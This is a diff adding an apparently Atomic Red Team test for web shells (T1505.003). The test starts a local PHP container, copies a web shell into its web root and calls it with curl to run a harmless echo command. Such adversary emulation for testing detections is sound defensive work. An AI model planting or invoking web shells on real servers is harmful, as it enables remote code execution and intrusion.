@@ -37,3 +37,52 @@ atomic_tests:
       del #{web_shell_path}\tests.jsp /q >nul 2>&1
       del #{web_shell_path}\cmd.aspx /q >nul 2>&1
     name: command_prompt
+- name: Invoke Web Shell in Dockerized PHP Server
+  auto_generated_guid: 98765432-dcba-4321-fe00-1234567890ab
+  description: |
+    Starts a PHP server using Docker, copies a web shell into it, invokes the web shell to achieve remote code execution (RCE), and then stops the container.
+  supported_platforms:
+    - linux
+  dependencies:
+    - description: |
+        Requires Docker to be installed and the user to have permissions to use Docker.
+      prereq_command: |
+        type docker
+      get_prereq_command: |
+        echo "Install Docker from https://docs.docker.com/get-docker/"
+  input_arguments:
+    web_shells:
+      description: Path of Web Shell
+      type: path
+      default: PathToAtomicsFolder/T1505.003/src
+    web_shell_cmd:
+      description: The command to execute from web shell
+      type: string
+      default: sh -c 'echo T1505.003 - hello from webshell'
+  dependency_executor_name: bash
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      mkdir -p /tmp/t1505_003
+
+      docker stop web_shell_test 2>/dev/null || : 
+      # TODO: build image locally
+      docker run --rm --name web_shell_test -d -p 127.0.0.1:8080:80 -v "/tmp/t1505_003:/htdocs" eriksoderblom/alpine-apache-php:24.01
+      
+      cp #{web_shells}/shell.php /tmp/t1505_003/shell.php
+      
+      # Wait for PHP server to get ready
+      sleep 3
+
+      # Host can be configured via HTTP_SERVER_NAME / HTTPS_SERVER_NAME
+      # See details at https://github.com/eriksoderblom/alpine-apache-php
+      curl http://127.0.0.1:8080/shell.php -H 'Host: www.example.com' \
+        -G --data-urlencode "cmd=#{web_shell_cmd}"
+
+
+      docker stop web_shell_test
+  cleanup_command: |
+      rm -r /tmp/t1505_003
+      docker rmi eriksoderblom/alpine-apache-php:24.01
+      # Consider removing image
